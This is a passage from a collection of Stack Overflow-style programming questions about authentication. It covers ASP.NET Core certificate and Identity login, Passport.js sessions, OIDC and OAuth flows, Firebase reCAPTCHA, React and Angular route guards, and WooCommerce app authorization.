.AddCertificate(&quot;CertificateScheme&quot;, options =&gt;
{
    options.Events = new CertificateAuthenticationEvents
    {
        OnCertificateValidated = async context =&gt;
        {
            var logger = context.HttpContext.RequestServices.GetRequiredService&lt;ILogger&lt;Program&gt;&gt;();
            logger.LogInformation(&quot;Starting certificate validation.&quot;);

            var userService = context.HttpContext.RequestServices.GetRequiredService&lt;IUserService&gt;();
            var ediNumber = Utilities.ExtractEdiNumberFromCertificate(context.ClientCertificate);
            logger.LogInformation($&quot;EDIPI extracted: {ediNumber}&quot;);

            var user = await userService.FindByEdipiAsync(ediNumber);
            if (user != null)
            {
                logger.LogInformation($&quot;User found: {user.UserName}. Authenticating.&quot;);
                // Proceed with creating principal and calling context.Success()
            }
            else
            {
                logger.LogWarning(&quot;User not found with EDIPI. Failing authentication.&quot;);
                context.Fail(&quot;No matching user found.&quot;);
            }
        }
    };

});
</code></pre>
<p>And I've created the following Middleware, which does seem to be executed, but by that point the user hasn't been authenticated so it always goes to the else clause:</p>
<pre><code>app.Use(async (context, next) =&gt;
{
var logger = context.RequestServices.GetRequiredService&lt;ILogger&lt;Program&gt;&gt;();
logger.LogInformation(&quot;Middleware Check: Start&quot;);

// Check if the current request is for the login page or the forgot password page
bool isLoginPage = context.Request.Path.StartsWithSegments(&quot;/Identity/Account/Login&quot;);
bool isForgotPasswordPage = context.Request.Path.StartsWithSegments(&quot;/Identity/Account/Login?authenticate=yes&quot;);

if (context.User.Identity.IsAuthenticated)
{
    logger.LogInformation(&quot;User is authenticated&quot;);
    if (context.User.HasClaim(c =&gt; c.Type == &quot;EDIPI&quot;))
    {
        logger.LogInformation(&quot;User authenticated via certificate with EDIPI&quot;);
        // Ensure we don't redirect if we're already on the target page
        if (!isForgotPasswordPage)
        {
            context.Response.Redirect(&quot;/Identity/Account/Login?authenticate=yes&quot;);
            return;
        }
    }

}
else
{
    logger.LogInformation(&quot;User is not authenticated&quot;);
    // This check ensures you're not redirecting API calls, non-interactive requests, or if already on the login page
    if (!isLoginPage &amp;&amp; !context.Request.Path.StartsWithSegments(&quot;/api&quot;) &amp;&amp; context.Request.Headers[&quot;Accept&quot;].ToString().Contains(&quot;text/html&quot;))
    {
        logger.LogInformation(&quot;Redirecting to login page&quot;);
        context.Response.Redirect(&quot;/Identity/Account/Login&quot;);
        return;
    }
}

await next();
});
</code></pre>
<p>I know I'm not actually logging the user in yet, and my redirect when the cert is authenticating is just using a query string add on for now, but this is just the initial shot and I will build from here.</p>
"
"<p>I am trying to make authentication next js 14 with mysql when i try to register a user this error appears &quot;TypeError: res.status is not a function&quot;.</p>
<p>I didnt know why and solutions?</p>
<p>api/register:</p>
<pre><code>import { connectToDatabase } from &quot;@/utils/db&quot;;

export async function POST(req, res) {
  const { username, email, password } = req.body;

  const db = await connectToDatabase();

  const existingUser = await db.query(&quot;SELECT * FROM users WHERE email = ?&quot;, [
    email,
  ]);

  if (existingUser.length &gt; 0) {
    return res.status(400).json({ message: &quot;Email already registered&quot; });
  }

  await db.query(
    &quot;INSERT INTO users (username, email, password) VALUES (?, ?, ?)&quot;,
    [username, email, password]
  );

  res.status(200).json({ message: &quot;Registration successful&quot; });
}
</code></pre>
<p>registerform:</p>
<pre><code>const [formData, setFormData] = useState({
    username: &quot;&quot;,
    email: &quot;&quot;,
    password: &quot;&quot;,
  });

  const handleChange = (e) =&gt; {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) =&gt; {
    e.preventDefault();

    try {
      const response = await axios.post(&quot;/api/register&quot;, formData);
      console.log(response.data);
    } catch (error) {
      console.error(&quot;Error registering user:&quot;, error);
    }
  };
</code></pre>
"
"<p>I'm currently implementing auth via OIDC. My frontend SPA is hosted on a different domain than the backend. When starting the login flow, I need to somehow store the generated code verifier to verify that the login completion request actually comes from the user who started the flow (at least thats how I understood the whole thing). I currently set the code verifier in a signed cookie. That way, I can just read and validate it in my backend. But since my frontend lives on a different domain than my backend, the cookie needs to be SameSite=&quot;none&quot; which will become blocked by chrome soon and is already blocked by other browsers.</p>
<p>I thought about encrypting and then passing the code verifier to the frontend SPA which then could save it to local storage, then do the redirect, then when redirected from the issuer to the SPA again, I would read it from local storage and send it along with the request. My backend would decrypt and use it to complete the flow, then return the tokens.</p>
<p>Is this safe to do?</p>
"
"<p>I will preface this by saying I am a little new to some of this and worry I may be over thinking this problem or re-inventing the wheel in some way.</p>
<p>I am making a game in Unity and want to include user validation/authentication so I can have unique usernames for scoreboards etc. I tried some of the built in methods like Google sign in for example but I want my game to be agnostic and not be limited to requiring the user to have a specific account like Google Play for example.</p>
<p>My idea is to store the user name in a database and link it to a unique hash for that player. This hash will also exist in an encrypted file on the players device. Now I want to be able to verify the user and user hash with the database when logging in, but in order to do that I need to decrypt the hash server side. I verified I can do this in python and have a script for it running in a local Xampp server, now I need to figure out how to make calls to this script and receive a response. So here are my questions:</p>
<ol>
<li>Is this overcomplicated or a flawed design</li>
<li>If not, how do I send and receive data from the python script. In Unity typically use UnityWebRequest which I think is similar to an HTTP request but am unsure how secure this is server side.</li>
<li>Some information I found pointed to this Python library <a href=""https://docs.python.org/3/library/http.server.html"" rel=""nofollow noreferrer"">HTTP server</a> but the top of the documentation warns about security issues</li>
</ol>
<p>Any advice or information would be greatly appreciated!</p>
"
"<p>I am building a full-stack app with a PERN stack. I can <code>POST</code> a username and password from the front-end to  <code>/login</code> and log in successfully - <code>isAuthenticated()</code> returns true. However, if I then send a <code>GET</code> request to <code>/current-session</code> <code>isAuthenticated()</code> returns false.</p>
<p>I am wondering where things might be going wrong. I have looked at every related issue I can find on Stack Overflow, and haven't found an answer yet.</p>
<p>The server is running. The database connection is established, and queries to the database work. The database table &quot;session&quot; is being populated. For example:</p>
<div class=""s-table-container""><table class=""s-table"">
<thead>
<tr>
<th>sid</th>
<th>sess</th>
<th>expire</th>
</tr>
</thead>
<tbody>
<tr>
<td>T6akfD8h0TWysQD2jZ5LqIBlxCBIcLSp</td>
<td>[object Object]</td>
<td>2024-03-06 00:54:22 +0000</td>
</tr>
</tbody>
</table></div>
<p>In the browswer, I can see the sid as a HTTP only cookie from the response headers when I <code>POST</code> to <code>/login</code>. For example:</p>
<pre><code>connect.sid=s%3AT6akfD8h0TWysQD2jZ5LqIBlxCBIcLSp.H01oGHOfFy9m6Tt451i%2F0vpoKuYEDPN8insL7Wx8GaU;
Path=/;
Expires=Wed, 06 Mar 2024 00:54:21 GMT;
HttpOnly
</code></pre>
<p>However, when I <code>GET</code> to <code>/current-session</code>, I don't see the cookie in the browser response.</p>
<p>It seems as if <code>app.use(passport.session());</code> is for some reason telling <code>app.get(&quot;/current-session&quot;...</code> that there is no current user session/current authenticated user. Wondering whether the session is not being maintained for some reason...?</p>
<p>From my logs, I can see that <code>passport.deserializeUser()</code> is never called.</p>
<p>Here is the current code:</p>
<pre><code>const express = require(&quot;express&quot;);
const session = require(&quot;express-session&quot;);
const passport = require(&quot;passport&quot;);
const LocalStrategy = require(&quot;passport-local&quot;);
const bcrypt = require(&quot;bcrypt&quot;);
const cors = require(&quot;cors&quot;);
const cookieParser = require(&quot;cookie-parser&quot;);
const { Pool } = require(&quot;pg&quot;);
const pgSession = require(&quot;connect-pg-simple&quot;)(session);
require(&quot;dotenv&quot;).config();

// -------------  GENERAL SETUP  --------------- //
const app = express();
const PORT = process.env.PORT || 3001;
app.use(
  cors({
    origin: &quot;https://nightlifeapp.onrender.com&quot;, // &quot;http://localhost:5173&quot;,
    credentials: true,
    &quot;Access-Control-Allow-Credentials&quot;: true,
  })
);
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

// -----------  DATABASE CONNECTION  ----------- //
// Create a PostgreSQL connection pool
const pool = new Pool({
  connectionString: process.env.ELEPHANTSQL_CONNECTION_URL,
  max: 5,
});

// Test the database connection
pool.connect((err, client, done) =&gt; {
  if (err) {
    console.error(&quot;Error connecting to the database&quot;, err);
  } else {
    console.log(&quot;Connected to the database&quot;);
  }
});


// -----------  PASSPORT STRATEGIES  ----------- //
passport.use(
  &quot;local&quot;,
  new LocalStrategy((username, password, done) =&gt; {
    // Query the PostgreSQL database to find a user by username
    pool.query(
      &quot;SELECT * FROM users WHERE username = $1&quot;,
      [username],
      (err, result) =&gt; {
        if (err) {
          return done(err);
        }
        // Check if the user exists
        const user = result.rows[0];
        if (!user) {
          return done(null, false);
        }
        // Check if the password is correct
        if (!bcrypt.compareSync(password, user.password_hash)) {
          return done(null, false);
        }
        // If the username and password are correct, return the user
        return done(null, user);
      }
    );
  })
);

passport.serializeUser((user, done) =&gt; {
  console.log(&quot;serializeUser invoked&quot;);
  done(null, user);
});
passport.deserializeUser((user, done) =&gt; {
  console.log(&quot;serializeUser invoked&quot;);
  done(null, user);
});


// -------------  EXPRESS SESSION  ------------- //
app.use(
  session({
    store: new pgSession({
      pool,
      tableName: &quot;session&quot;,
    }),
    secret: process.env.EXPRESS_SESSION_SECRET_KEY,
    resave: false,
    saveUninitialized: false,
    cookie: {
      maxAge: 14 * 24 * 60 * 60 * 1000, // 14 days session timeout
    },
  })
);

app.use(passport.initialize());
app.use(passport.session());


// -----------------  ROUTING  ----------------- //
app.get(&quot;/current-session&quot;, passport.authenticate(&quot;session&quot;), (req, res) =&gt; {
  if (req.isAuthenticated()) {
    console.log(&quot;At GET /current-session... isAuthenticated() returned true&quot;);
  } else {
    console.log(&quot;At GET /current-session... isAuthenticated() returned false&quot;);
  }

  if (!req.user) {
    res.json({ currentlyLoggedIn: false });
  } else {
    res.json({
      currentlyLoggedIn: true,
      userId: req.user.user_id,
      username: req.user.username,
    });
  }
});

app.post(
  &quot;/login&quot;,
  passport.authenticate(&quot;local&quot;), (req, res) =&gt; {
    if (req.isAuthenticated()) {
      console.log(&quot;At POST /login... isAuthenticated() returned true&quot;);
    } else {
      console.log(&quot;At POST /login... isAuthenticated() returned false&quot;);
    }

    return res.json({
      loginSuccessful: true,
      userId: req.user.user_id,
      username: req.user.username,
    });
  }
);

// ------------------  SERVER  ----------------- //
const server = app.listen(PORT, () =&gt;
  console.log(`Server is listening on port ${PORT}`)
);

server.keepAliveTimeout = 120 * 1000;
server.headersTimeout = 120 * 1000;

</code></pre>
<p>On the front-end, the fetch requests I'm making to <code>/login</code> and <code>/current-session</code> are as follows:</p>
<pre><code>fetch(`${URL}/login`, {
      method: &quot;POST&quot;,
      credentials: &quot;include&quot;,
      headers: {
        &quot;Content-Type&quot;: &quot;application/json&quot;,
        Accept: &quot;application/json&quot;,
        &quot;Access-Control-Allow-Origin&quot;: &quot;https://nightlifeapp.onrender.com&quot;,
      },
      body: jsonData,
    })
</code></pre>
<p>And</p>
<pre><code>fetch(`${URL}/current-session`, {
      method: &quot;GET&quot;,
      credentials: &quot;include&quot;,
      headers: {
        &quot;Content-Type&quot;: &quot;application/json&quot;,
        Accept: &quot;application/json&quot;,
        &quot;Access-Control-Allow-Origin&quot;: &quot;https://nightlifeapp.onrender.com&quot;,
      },
    })```


Any suggestions would be greatly appreciated!

</code></pre>
"
"<p>I have a flutter app where I perform user authentication with Firebase's email and password authentication. I want to secure the app from spam/bot attacks so that it doesn't cost me a fortune to host my users on Firebase. I have the sign up with email and password, login, and forgot password that I want to secure with something like reCaptcha. The app will be available on ios, android, macos, and potentially web. What is the easiest and the most secure way of implementing this?</p>
<p>So far, I have tried looking into flutter docs for plugins but the ones I found were all only for web apps. I also tried implementing reCaptcha V3 through Firebase's App Check feature and it sends requests to my reCaptcha API but does not seem to be working in release mode. Moreover, the App Check for android only supports Play Integrity which is a paid version and I would prefer a free service. I haven't yet looked into SafetyNet.</p>
"
"<p>I working on Login feature in ASP.NET Core 6.</p>
<p>Here is my login action in the <code>AccountController</code>:</p>
<pre><code>public class AccountController : Controller
{
    private UserManager&lt;AppUserModel&gt; _userManager;
    private SignInManager&lt;AppUserModel&gt; _signInManager;

    public AccountController(UserManager&lt;AppUserModel&gt; userManager, SignInManager&lt;AppUserModel&gt; signInManager) 
    {
        _userManager = userManager;
        _signInManager = signInManager;
    }

    public IActionResult Index()
    {
        return View();
    }

    [HttpPost]
    public async Task&lt;IActionResult&gt; Login(UserModel user)
    {
        if (ModelState.IsValid)
        {
            Microsoft.AspNetCore.Identity.SignInResult result = await _signInManager.PasswordSignInAsync(user.UserName,user.Password,false,false);

            if (result.Succeeded)
            {
                return RedirectToAction(&quot;Index&quot;, &quot;Home&quot;);
            }

            ModelState.AddModelError(&quot;&quot;, &quot;Error&quot;);
        }

        return RedirectToAction(&quot;Index&quot;, &quot;Home&quot;);
    }
}
</code></pre>
<p>Here is my login form in the views folder:</p>
<pre><code>&lt;header&gt;Login&lt;/header&gt;
&lt;form asp-action=&quot;Login&quot; asp-controller=&quot;Account&quot;&gt;
     &lt;div asp-validation-summary=&quot;ModelOnly&quot; class=&quot;text-danger&quot;&gt;&lt;/div&gt;
     &lt;div class=&quot;form-group&quot;&gt;
         &lt;label asp-for=&quot;UserName&quot; class=&quot;control-label&quot;&gt;&lt;/label&gt;
         &lt;input asp-for=&quot;UserName&quot; class=&quot;form-control&quot; /&gt;
         &lt;span asp-validation-for=&quot;UserName&quot; class=&quot;text-danger&quot;&gt;&lt;/span&gt;
     &lt;/div&gt;
     &lt;div class=&quot;form-group&quot;&gt;
         &lt;label asp-for=&quot;Password&quot; class=&quot;control-label&quot;&gt;&lt;/label&gt;
         &lt;input asp-for=&quot;Password&quot; type=&quot;password&quot; class=&quot;form-control&quot; /&gt;
         &lt;span asp-validation-for=&quot;Password&quot; class=&quot;text-danger&quot;&gt;&lt;/span&gt;
     &lt;/div&gt;

     &lt;div class=&quot;form-group&quot;&gt;
         &lt;input type=&quot;submit&quot; value=&quot;Login&quot; class=&quot;btn btn-primary&quot; /&gt;
     &lt;/div&gt;
&lt;/form&gt; 
</code></pre>
<p>When I'm done logging in, I want to change my Razor into Hi + UserName</p>
<pre><code>&lt;!-- TOP HEADER --&gt;
&lt;div id=&quot;top-header&quot;&gt;
    &lt;div class=&quot;container&quot;&gt;
        &lt;ul class=&quot;header-links pull-left&quot;&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-phone&quot;&gt;&lt;/i&gt; +021-95-51-84&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-envelope-o&quot;&gt;&lt;/i&gt; email@email.com&lt;/a&gt;&lt;/li&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-map-marker&quot;&gt;&lt;/i&gt; 1734 Stonecoal Road&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
        &lt;ul class=&quot;header-links pull-right&quot;&gt;
            &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;fa fa-dollar&quot;&gt;&lt;/i&gt; USD&lt;/a&gt;&lt;/li&gt;
            @if (User.Identity?.IsAuthenticated ?? false)
            {
                &lt;li&gt;&lt;i class=&quot;fa fa-user-o&quot;&gt;Hi, @User.Identity.Name&lt;/i&gt;&lt;/li&gt;
                &lt;li&gt;&lt;a href=&quot;checkout.html&quot;&gt;&lt;i class=&quot;fa fa-crosshairs&quot;&gt;Logout&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
            }
            else
            {
                &lt;li&gt;&lt;a asp-action=&quot;Index&quot; asp-controller=&quot;Account&quot;&gt;&lt;i class=&quot;fa fa-user-o&quot;&gt;&lt;/i&gt; Login&lt;/a&gt;&lt;/li&gt;
            }
        &lt;/ul&gt;
    &lt;/div&gt;
&lt;/div&gt;
</code></pre>
<p>I use header is a partial view in the layout. Does it affect anything?</p>
<pre><code>&lt;div class=&quot;header&quot;&gt;
    @await Html.PartialAsync(&quot;~/Views/Shared/Partial/_HeaderTopPartial.cshtml&quot;)
&lt;/div&gt;
</code></pre>
<p>I already add the service, Authentication and <code>UseAuthorization</code> in <code>Program.cs</code>. When I'm done logging in, the header doesn't change.</p>
<p>Does anyone know the problem? Thanks for your help and spending time reading my problem
Here a updated Program.cs</p>
<pre><code>using GiayDep.Models;
using Microsoft.EntityFrameworkCore;
using GiayDep.Areas.Admin.InterfacesRepositories;
using GiayDep.Areas.Admin.Repositories;
using System.Configuration;
using Microsoft.AspNetCore.Identity;

namespace GiayDep
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var builder = WebApplication.CreateBuilder(args);

            // Add services to the container.
            builder.Services.AddControllersWithViews();
            builder.Services.AddDbContext&lt;GiaydepContext&gt;(options =&gt;
            {
                options.UseSqlServer(builder.Configuration.GetConnectionString(&quot;Store&quot;));

            });
            builder.Services.AddIdentity&lt;AppUserModel,IdentityRole&gt;()
    .AddEntityFrameworkStores&lt;GiaydepContext&gt;().AddDefaultTokenProviders();
            builder.Services.Configure&lt;IdentityOptions&gt;(options =&gt;
            {
                // Password settings.
                options.Password.RequireDigit = true;
                options.Password.RequireLowercase = true;
                options.Password.RequireNonAlphanumeric = false;
                options.Password.RequireUppercase = false;
                options.Password.RequiredLength = 4;
              

          

                // User settings.
                options.User.RequireUniqueEmail = true;
            });
            builder.Services.AddDistributedMemoryCache();
            builder.Services.AddSession(options =&gt;
            {
                options.IdleTimeout = TimeSpan.FromMinutes(30); // Set the session timeout as needed
                options.Cookie.IsEssential = true;
            });
           
            builder.Services.AddScoped&lt;INhaSXRepository, NhaSXRepository&gt;();
            builder.Services.AddScoped&lt;INhaCungCapRepositorycs, NhaCCRepository&gt;();
            builder.Services.AddScoped&lt;ILoaiSpRepositorycs, LoaiSpRepository&gt;();
            builder.Services.AddSingleton&lt;IHttpContextAccessor, HttpContextAccessor&gt;();
            builder.Services.AddHttpContextAccessor();
            var app = builder.Build();

            // Configure the HTTP request pipeline.
            if (!app.Environment.IsDevelopment())
            {
                app.UseExceptionHandler(&quot;/Home/Error&quot;);
                // The default HSTS value is 30 days. You may want to change this for production scenarios, see https://aka.ms/aspnetcore-hsts.
                app.UseHsts();
            }

            app.UseHttpsRedirection();
            app.UseStaticFiles();

            app.UseRouting();


            app.UseAuthentication();
            app.UseAuthorization();
            app.UseEndpoints(endpoints =&gt;
            {
                endpoints.MapControllerRoute(
                    name: &quot;areas&quot;,
                    pattern: &quot;{area:exists}/{controller=Admin}/{action=Index}/{id?}&quot;
                );

                endpoints.MapControllerRoute(
                    name: &quot;default&quot;,
                    pattern: &quot;{controller=Home}/{action=Index}/{id?}&quot;);
            });
            app.Run();
          
        }
    }
}
</code></pre>
"
"<pre><code>const expressJwt = require('express-jwt')


function authJwt(){
    const secret= process.env.secret;
    return expressJwt({
        secret,
        algorithms: ['HS256']
    })
}

module.exports = authJwt;
</code></pre>
<p>i tried replacing expressJwt with {expressJwt},{expressjwt:expressJwt} and other solution given earlier. I also tried a version older than 7 but it also didn't work.</p>
"
"<p>I have set up authentication for my app service and I am trying to call my web job using the webhook url. I want to pass the OAuth token rather than basic auth. Is there any way to do this?</p>
<p>I have tried sending the token in the web hook call in postman but it gives me 403 forbidden error.</p>
"
"<p>My problem here is that I did my first C++ Project which is a User Authentication project and everything works perfectly fine but just one tiny problem. The thing is that Once the user signs up with lets say  two words and it gets stored and I try logging in with that full name it gives me a user login failed meanwhile the txt file shows that the username entered is actually correct. But with a single word for user name signup it actually works. Any help?</p>
<p>Here is my code;</p>
<pre><code>
#include &lt;iostream&gt;
#include &lt;algorithm&gt;
#include &lt;cctype&gt;
#include &lt;fstream&gt;

using namespace std;

int main()
{

    string User_Option;


    cout &lt;&lt; &quot;Do you want to Login Or Signup&quot; &lt;&lt; endl &lt;&lt; endl;
    getline(cin, User_Option);
    transform(User_Option.begin(), User_Option.end(), User_Option.begin(), ::toupper);



    string Username_In_System;
    string Password_In_System;
    string Username;
    string Password;



    if (User_Option == &quot;SIGNUP&quot; || User_Option == &quot;SIGN UP&quot;){

    ofstream RecordFile;
    RecordFile.open(&quot;record.txt&quot;);

    cout &lt;&lt; endl &lt;&lt; endl &lt;&lt; &quot;USER AUTHENTICATION&quot; &lt;&lt; endl;

    cout &lt;&lt; endl &lt;&lt; &quot;|*****************|&quot; &lt;&lt; endl;

    cout &lt;&lt; endl &lt;&lt; &quot;SIGN UP FORM&quot; &lt;&lt; endl;



    cout &lt;&lt; endl &lt;&lt; &quot;Enter Username: &quot; &lt;&lt; endl;

    getline(cin, Username_In_System);

    cout &lt;&lt; endl &lt;&lt; &quot;Enter Password: &quot; &lt;&lt; endl;
    cin &gt;&gt; Password_In_System;

    cout &lt;&lt; endl &lt;&lt; endl &lt;&lt; &quot;Registration Success&quot; &lt;&lt; endl;

    RecordFile &lt;&lt; Username_In_System &lt;&lt; &quot;   &quot; &lt;&lt; Password_In_System &lt;&lt; endl;
    RecordFile.close();

    }


    else if (User_Option == &quot;LOGIN&quot; || User_Option == &quot;LOG IN&quot; || User_Option == &quot;SIGNIN&quot; || User_Option == &quot;SIGN IN&quot;){

    ifstream InputFile;
    InputFile.open(&quot;record.txt&quot;);


    cout &lt;&lt; endl &lt;&lt; endl &lt;&lt; &quot;USER AUTHENTICATION&quot; &lt;&lt; endl;

    cout &lt;&lt; endl &lt;&lt; &quot;|*****************|&quot; &lt;&lt; endl;

    cout &lt;&lt; endl &lt;&lt; &quot;SIGN IN FORM&quot; &lt;&lt; endl;



    cout &lt;&lt; endl &lt;&lt; &quot;Enter Username: &quot; &lt;&lt; endl;
    getline(cin, Username);

    cout &lt;&lt; endl &lt;&lt; &quot;Enter Password: &quot; &lt;&lt; endl;
    cin &gt;&gt; Password;

    if (InputFile &gt;&gt; Username_In_System &amp;&amp; InputFile &gt;&gt; Password_In_System &amp;&amp; Username_In_System == Username &amp;&amp; Password_In_System == Password) {

        cout &lt;&lt; endl &lt;&lt; &quot;Login Success&quot; &lt;&lt; endl;
    }
    else {
        cout &lt;&lt; endl &lt;&lt; &quot;Login Error&quot; &lt;&lt; endl;
    }

    InputFile.close();

    }



     else {
        cout &lt;&lt; endl &lt;&lt;&quot;Input Error&quot; &lt;&lt; endl;
    }

    return 0;

}


</code></pre>
<p>I Literally expect it to work but the white space in the words at login is the problem and i'm sure.</p>
"
"<p>I'm encountering an issue with the angular-auth-oidc-client package in my Angular 14 application regarding the behavior of auto-login when opening a new tab. While the authentication process itself seems to be functioning correctly, there's a problem with the redirection behavior after auto-login.</p>
<p><strong>Library</strong>:  <a href=""https://www.npmjs.com/package/angular-auth-oidc-client"" rel=""nofollow noreferrer"">angular-auth-oidc-client</a></p>
<p><em>Scenario:</em></p>
<p>User is logged in on the main tab of the application.
User opens a new tab and navigates directly to a specific page, such as &quot;my-account&quot;.
Expected Behavior:
After auto-login, the user should be redirected to the requested page, in this case, &quot;my-account&quot;.</p>
<p>Actual Behavior:
Instead of being redirected to the requested page (&quot;my-account&quot;), the application redirects the user back to the initial page (e.g., the home page).</p>
<p>This behavior is not ideal for the user experience, as it disrupts the intended flow of navigation within the application.</p>
<p>*- Question:- *</p>
<ol>
<li>How can I effectively use the AutoLoginPartialRoutesGuard to ensure correct redirection after   auto-login?</li>
<li>Are there any alternative approaches or configurations I should consider to address this issue?</li>
</ol>
<p><strong>Any insights or suggestions would be greatly appreciated.
Thank you!</strong></p>
<p>I've tried implementing the AutoLoginPartialRoutesGuard to handle the redirection, but it hasn't resolved the issue. I'm seeking assistance on how to properly configure the AutoLoginPartialRoutesGuard or any other approach to ensure that users are redirected to the intended page after auto-login, particularly when opening a new tab.</p>
<p>Route File</p>
<pre><code>   RouterModule.forRoot([
      {
        path: '',
        canActivate: [AuthorizationGuard],
        component: MainComponent,
        children: [
          {
            path: '',
            redirectTo: 'overview',
            pathMatch: 'full'
          },
          {
            path: 'orders',
            loadChildren: () =&gt; import('./modules/orders/orders.module').then(m =&gt; m.OrdersModule),
            canActivate: [AutoLoginPartialRoutesGuard],
          },
          {
            path: '**',
            redirectTo: ''
          }
        ]
      }
    ], {
      useHash: environment.hashRouting,
      scrollPositionRestoration: 'enabled'
    })
</code></pre>
<p>Auth Config</p>
<pre><code>export const httpLoaderFactory = () =&gt; {

  const authOptions$: Observable&lt;OpenIdConfiguration&gt; = config$.pipe(
    map((authOptions: AuthOptions) =&gt; {
      return {
        authority: authOptions.authEndpoint,
        redirectUrl: 'https://localhost:3000',
        postLogoutRedirectUri: 'https://localhost:3000',
        clientId: authOptions.spaClientId,
        scope: 'openid profile offline_access',
        responseType: 'code',
        secureRoutes: [authOptions.apiEndpoint, authOptions.authEndpoint],
        silentRenew: true,
        useRefreshToken: true,
        ignoreNonceAfterRefresh: true,
        automaticSilentRenew: true,
        disableIdTokenValidation: true,
        autoUserInfo: false
      } as OpenIdConfiguration;
    })
  );
  return new StsConfigHttpLoader(authOptions$);
};
</code></pre>
<p>Auth Guard</p>
<pre><code>export class AuthorizationGuard implements CanActivate {

  constructor(private authService: AuthService) { }

  canActivate(route: ActivatedRouteSnapshot, state: RouterStateSnapshot): boolean | UrlTree | Observable&lt;boolean | UrlTree&gt; | Promise&lt;boolean | UrlTree&gt; {
    return this.authService.isAuthorized().pipe(
      map(isAuthorized =&gt; {
        if (!isAuthorized) this.authService.authorize();
        return isAuthorized;
      })
    );
  }
}
</code></pre>
"
"<pre><code>/ index.tsx

import React from 'react';
import ReactDOM from 'react-dom/client';
import './index.css';
import App from './App';
import { BrowserRouter } from 'react-router-dom';

const root = ReactDOM.createRoot(
  document.getElementById('root') as HTMLElement
);
root.render(
  &lt;React.StrictMode&gt;
    &lt;BrowserRouter&gt;
      &lt;App /&gt;
    &lt;/BrowserRouter&gt;
  &lt;/React.StrictMode&gt;
);

// App.tsx

import React from 'react';
import './App.css';
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Login from './pages/Login';
import Dashboard from './pages/Dashboard';
import AuthGuard from './middleware/AuthGuard';

function App() {
  return (
    &lt;Routes&gt;
      &lt;Route path='/' element={&lt;AuthGuard component={&lt;Login /&gt;} /&gt;} /&gt;
      &lt;Route path='/dashboard' element={&lt;AuthGuard component={&lt;Dashboard /&gt;} /&gt;} /&gt;
      &lt;Route path='*' element={&lt;h1&gt;Page Not Found&lt;/h1&gt;} /&gt;
    &lt;/Routes&gt;
  );
}

export default App;

// AuthGuard.tsx

import { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

const AuthGuard = ({ component }: { component: any }) =&gt; {
  const navigate = useNavigate();
  const pathName = window.location.pathname;

  useEffect(() =&gt; {
    if (localStorage.getItem('examToken')) {
      if (JSON.parse(localStorage.getItem('examToken')!))
        pathName === '/' &amp;&amp; navigate('/dashboard');
    } else {
      pathName !== '/' &amp;&amp; navigate('/');
    }
  }, [component]);

  return &lt;&gt;{component}&lt;/&gt;;
};

export default AuthGuard;
</code></pre>
<p>when I hit the http://localhost:3000/dashboard URL, it renders the dashboard page and redirects to the path '/'.
I have made the authwrapper for - Without login user can not access the pages.</p>
<p>I had already done the redirection of authentication. I want to hide components until the process is over.
How can we hide the dashboard? or we can show any loading sign so that the dashboard will not be visible in between processes.</p>
"
"<p><a href=""https://i.stack.imgur.com/vFc34.png"" rel=""nofollow noreferrer"">Postman Screenshot1</a>
<a href=""https://i.stack.imgur.com/GyB3X.png"" rel=""nofollow noreferrer"">Postman Screenshot2</a></p>
<p>I'm currently working on integrating OAuth 1.0 authentication into my C# Web API project. I need to use the HMAC-SHA256 signature method, and I'm encountering issues with generating the correct OAuth header.
I need to pass consumerKey,consumerSecret,accessToken,accessTokenSecret,realm to the request headers and i should not send timestamp and nonce with the headers</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-html lang-html prettyprint-override""><code>public class OAuth1HttpClient
    {
        private const string url = """";
        private const string consumerKey = """";
        private const string consumerSecret = """";
        private const string accessToken = """";
        private const string accessTokenSecret = """";
        private const string realm = """";

        public async Task&lt;string&gt; TestConnectionAsync()
        {
            using (HttpClient httpClient = new HttpClient())
            {
                
                var authorizationHeader = ""oauth_consumer_key="" + Uri.EscapeDataString(consumerKey) + ""&amp;"" +
                                         ""oauth_signature_method=HMAC-SHA1&amp;"" +
                                         ""oauth_token="" + Uri.EscapeDataString(accessToken) + ""&amp;"" +
                                         ""oauth_version=1.0"" +
                                         ""realm=\"""" + Uri.EscapeDataString(realm) + ""\"""";

                httpClient.DefaultRequestHeaders.Add(""Authorization"", authorizationHeader);

                HttpResponseMessage response = httpClient.GetAsync(url).Result;

      string responseData =  response.Content.ReadAsStringAsync().Result;
                return responseData;

   }
 } </code></pre>
</div>
</div>
</p>
"
"<p>I'm working on an invoicing API, and I've been asked to synchronize WooCommerce users' stores with my API. I looked for information in the WooCommerce API documentation and found a request method that authorizes the synchronization of stores with my API. The user has to enter the URL of their store and they will be redirected to the authorization page, but after several attempts I have not been able to get the authorization request to appear.
NOTE:Consumer key and Consumer Secret are properly placed in the code</p>
<pre><code>&lt;?php
// Verifica se o formulário foi enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtém o URL da loja WooCommerce do formulário
    $store_url = $_POST['store_url'];
    $app_name = 'GESfaturacao';
    $user_id = '1';
    $consumer_key = '[my_consumer_key]';
    $consumer_secret = '[my_consumer_secret]';
    $callback_url = 'https://localhost:8081/server/WooCommerce/callback-autorizacao.php';
    $return_url = 'https://localhost:8081/server/WooCommerce/retorno-autorizacao.php';
    $scope = 'write';
    $endpoint = '/wc-auth/v1/authorize';
 
    // Constrói os parâmetros de autorização
    $params = [
        'app_name' =&gt; $app_name,
        'scope' =&gt; $scope,
        'user_id' =&gt; $user_id,
        'return_url' =&gt; $return_url,
        'callback_url' =&gt; $callback_url
    ];
 
 
    $authorization_url = $store_url . $endpoint.'?' . http_build_query($params);
 
